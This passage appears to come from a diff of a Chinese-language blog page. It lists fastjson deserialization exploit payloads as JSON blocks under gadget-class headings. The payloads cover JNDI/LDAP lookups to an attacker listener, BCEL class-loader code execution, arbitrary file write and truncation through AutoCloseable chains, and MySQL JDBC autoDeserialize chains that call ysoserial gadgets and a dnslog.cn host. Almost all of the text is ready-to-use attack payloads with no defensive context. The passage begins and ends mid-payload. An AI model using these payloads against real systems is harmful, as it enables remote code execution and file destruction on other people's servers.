+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONReader"</span><span class="token punctuation">,</span>
+		<span class="token property">"reader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"jdk.nashorn.api.scripting.URLReader"</span><span class="token punctuation">,</span>
+			<span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1:9999"</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AutoCloseable-任意文件写入"><a href="#AutoCloseable-任意文件写入" class="headerlink" title="AutoCloseable 任意文件写入"></a>AutoCloseable 任意文件写入</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream"</span><span class="token punctuation">,</span>
+	<span class="token property">"out"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
+		<span class="token property">"file"</span><span class="token operator">:</span> <span class="token string">"/path/to/target"</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.compress.compressors.gzip.GzipParameters"</span><span class="token punctuation">,</span>
+		<span class="token property">"filename"</span><span class="token operator">:</span> <span class="token string">"filecontent"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"@type"</span> <span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp.BasicDataSource"</span><span class="token punctuation">,</span>
+  <span class="token property">"driverClassName"</span> <span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A..."</span><span class="token punctuation">,</span>
+  <span class="token property">"driverClassLoader"</span> <span class="token operator">:</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JndiConverter"><a href="#JndiConverter" class="headerlink" title="JndiConverter"></a>JndiConverter</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="token punctuation">,</span>
+	<span class="token property">"AsText"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JtaTransactionConfig"><a href="#JtaTransactionConfig" class="headerlink" title="JtaTransactionConfig"></a>JtaTransactionConfig</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"</span><span class="token punctuation">,</span>
+	<span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.util.Properties"</span><span class="token punctuation">,</span>
+		<span class="token property">"UserTransaction"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.shiro.jndi.JndiObjectFactory"</span><span class="token punctuation">,</span>
+	<span class="token property">"resourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AnterosDBCPConfig"><a href="#AnterosDBCPConfig" class="headerlink" title="AnterosDBCPConfig"></a>AnterosDBCPConfig</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span>
+	<span class="token property">"metricRegistry"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AnterosDBCPConfig2"><a href="#AnterosDBCPConfig2" class="headerlink" title="AnterosDBCPConfig2"></a>AnterosDBCPConfig2</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"br.com.anteros.dbcp.AnterosDBCPConfig"</span><span class="token punctuation">,</span>
+	<span class="token property">"healthCheckRegistry"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="CacheJndiTmLookup"><a href="#CacheJndiTmLookup" class="headerlink" title="CacheJndiTmLookup"></a>CacheJndiTmLookup</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"</span><span class="token punctuation">,</span>
+	<span class="token property">"jndiNames"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AutoCloseable-清空指定文件"><a href="#AutoCloseable-清空指定文件" class="headerlink" title="AutoCloseable 清空指定文件"></a>AutoCloseable 清空指定文件</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
+    <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/tmp/nonexist"</span><span class="token punctuation">,</span>
+    <span class="token property">"append"</span><span class="token operator">:</span><span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AutoCloseable-清空指定文件-1"><a href="#AutoCloseable-清空指定文件-1" class="headerlink" title="AutoCloseable 清空指定文件"></a>AutoCloseable 清空指定文件</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.io.FileWriter"</span><span class="token punctuation">,</span>
+    <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/tmp/nonexist"</span><span class="token punctuation">,</span>
+    <span class="token property">"append"</span><span class="token operator">:</span><span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AutoCloseable-任意文件写入-1"><a href="#AutoCloseable-任意文件写入-1" class="headerlink" title="AutoCloseable 任意文件写入"></a>AutoCloseable 任意文件写入</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"stream"</span><span class="token operator">:</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
+        <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/tmp/nonexist"</span><span class="token punctuation">,</span>
+        <span class="token property">"append"</span><span class="token operator">:</span><span class="token boolean">false</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token property">"writer"</span><span class="token operator">:</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.solr.common.util.FastOutputStream"</span><span class="token punctuation">,</span>
+        <span class="token property">"tempBuffer"</span><span class="token operator">:</span><span class="token string">"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4="</span><span class="token punctuation">,</span>
+        <span class="token property">"sink"</span><span class="token operator">:</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.stream"</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+        <span class="token property">"start"</span><span class="token operator">:</span><span class="token number">38</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token property">"close"</span><span class="token operator">:</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.iq80.snappy.SnappyOutputStream"</span><span class="token punctuation">,</span>
+        <span class="token property">"out"</span><span class="token operator">:</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.writer"</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="AutoCloseable-MarshalOutputStream-任意文件写入"><a href="#AutoCloseable-MarshalOutputStream-任意文件写入" class="headerlink" title="AutoCloseable MarshalOutputStream 任意文件写入"></a>AutoCloseable MarshalOutputStream 任意文件写入</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	'@type'<span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+	'@type'<span class="token operator">:</span> 'sun.rmi.server.MarshalOutputStream'<span class="token punctuation">,</span>
+	'out'<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		'@type'<span class="token operator">:</span> 'java.util.zip.InflaterOutputStream'<span class="token punctuation">,</span>
+		'out'<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+			'@type'<span class="token operator">:</span> 'java.io.FileOutputStream'<span class="token punctuation">,</span>
+			'file'<span class="token operator">:</span> 'dst'<span class="token punctuation">,</span>
+			'append'<span class="token operator">:</span> <span class="token boolean">false</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+		'infl'<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+			'input'<span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+				'array'<span class="token operator">:</span> 'eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=='<span class="token punctuation">,</span>
+				'limit'<span class="token operator">:</span> <span class="token number">22</span>
+			<span class="token punctuation">&#125;</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+		'bufLen'<span class="token operator">:</span> <span class="token number">1048576</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	'protocolVersion'<span class="token operator">:</span> <span class="token number">1</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="BasicDataSource-1"><a href="#BasicDataSource-1" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
+    <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>
+    <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="HikariConfig"><a href="#HikariConfig" class="headerlink" title="HikariConfig"></a>HikariConfig</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span>
+	<span class="token property">"metricRegistry"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="HikariConfig-1"><a href="#HikariConfig-1" class="headerlink" title="HikariConfig"></a>HikariConfig</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig"</span><span class="token punctuation">,</span>
+	<span class="token property">"metricRegistry"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="SessionBeanProvider"><a href="#SessionBeanProvider" class="headerlink" title="SessionBeanProvider"></a>SessionBeanProvider</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.proxy.provider.remoting.SessionBeanProvider"</span><span class="token punctuation">,</span>
+	<span class="token property">"jndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+	<span class="token property">"Object"</span><span class="token operator">:</span> <span class="token string">"su18"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JMSContentInterceptor"><a href="#JMSContentInterceptor" class="headerlink" title="JMSContentInterceptor"></a>JMSContentInterceptor</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.cocoon.components.slide.impl.JMSContentInterceptor"</span><span class="token punctuation">,</span>
+	<span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.util.Hashtable"</span><span class="token punctuation">,</span>
+		<span class="token property">"java.naming.factory.initial"</span><span class="token operator">:</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">,</span>
+		<span class="token property">"topic-factory"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token string">""</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="ContextClassLoaderSwitcher"><a href="#ContextClassLoaderSwitcher" class="headerlink" title="ContextClassLoaderSwitcher"></a>ContextClassLoaderSwitcher</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.jboss.util.loading.ContextClassLoaderSwitcher"</span><span class="token punctuation">,</span>
+	<span class="token property">"contextClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="OracleManagedConnectionFactory"><a href="#OracleManagedConnectionFactory" class="headerlink" title="OracleManagedConnectionFactory"></a>OracleManagedConnectionFactory</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span><span class="token punctuation">,</span>
+	<span class="token property">"xaDataSourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JNDIConfiguration"><a href="#JNDIConfiguration" class="headerlink" title="JNDIConfiguration"></a>JNDIConfiguration</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.configuration.JNDIConfiguration"</span><span class="token punctuation">,</span>
+	<span class="token property">"prefix"</span><span class="token operator">:</span> <span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="JDBC4Connection"><a href="#JDBC4Connection" class="headerlink" title="JDBC4Connection"></a>JDBC4Connection</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mysql.jdbc.JDBC4Connection"</span><span class="token punctuation">,</span>
+	<span class="token property">"hostToConnectTo"</span><span class="token operator">:</span> <span class="token string">"172.20.64.40"</span><span class="token punctuation">,</span>
+	<span class="token property">"portToConnectTo"</span><span class="token operator">:</span> <span class="token number">3306</span><span class="token punctuation">,</span>
+	<span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"</span><span class="token punctuation">,</span>
+	<span class="token property">"databaseToConnectTo"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>
+	<span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.util.Properties"</span><span class="token punctuation">,</span>
+		<span class="token property">"PORT"</span><span class="token operator">:</span> <span class="token string">"3306"</span><span class="token punctuation">,</span>
+		<span class="token property">"statementInterceptors"</span><span class="token operator">:</span> <span class="token string">"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"</span><span class="token punctuation">,</span>
+		<span class="token property">"autoDeserialize"</span><span class="token operator">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>
+		<span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn"</span><span class="token punctuation">,</span>
+		<span class="token property">"PORT.1"</span><span class="token operator">:</span> <span class="token string">"3306"</span><span class="token punctuation">,</span>
+		<span class="token property">"HOST.1"</span><span class="token operator">:</span> <span class="token string">"172.20.64.40"</span><span class="token punctuation">,</span>
+		<span class="token property">"NUM_HOSTS"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+		<span class="token property">"HOST"</span><span class="token operator">:</span> <span class="token string">"172.20.64.40"</span><span class="token punctuation">,</span>
+		<span class="token property">"DBNAME"</span><span class="token operator">:</span> <span class="token string">"test"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="LoadBalancedMySQLConnection"><a href="#LoadBalancedMySQLConnection" class="headerlink" title="LoadBalancedMySQLConnection"></a>LoadBalancedMySQLConnection</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+	<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection"</span><span class="token punctuation">,</span>
+	<span class="token property">"proxy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token property">"connectionString"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="UnpooledDataSource"><a href="#UnpooledDataSource" class="headerlink" title="UnpooledDataSource"></a>UnpooledDataSource</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+	<span class="token property">"x"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+		<span class="token punctuation">&#123;</span>
+			<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>
+			<span class="token property">"name"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+				<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+				<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"</span>
+			<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+			<span class="token property">"c"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+				<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"</span><span class="token punctuation">,</span>
+				<span class="token property">"key"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+					<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+					<span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
+				<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+				<span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+					<span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
+				<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+				<span class="token property">"driver"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$..."</span>
+			<span class="token punctuation">&#125;</span>
+		<span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token string">"a"</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="LoadBalancedMySQLConnection2"><a href="#LoadBalancedMySQLConnection2" class="headerlink" title="LoadBalancedMySQLConnection2"></a>LoadBalancedMySQLConnection2</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span> <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span> <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection"</span><span class="token punctuation">,</span> <span class="token property">"proxy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"connectionString"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc"</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="ReplicationMySQLConnection"><a href="#ReplicationMySQLConnection" class="headerlink" title="ReplicationMySQLConnection"></a>ReplicationMySQLConnection</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+   <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
+   <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection"</span><span class="token punctuation">,</span>
+   <span class="token property">"proxy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+      <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy"</span><span class="token punctuation">,</span>
+      <span class="token property">"connectionUrl"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+         <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.mysql.cj.conf.url.ReplicationConnectionUrl"</span><span class="token punctuation">,</span>
+         <span class="token property">"masters"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>
+            <span class="token property">"host"</span><span class="token operator">:</span><span class="token string">""</span>
+         <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+         <span class="token property">"slaves"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+         <span class="token property">"properties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+            <span class="token property">"host"</span><span class="token operator">:</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>
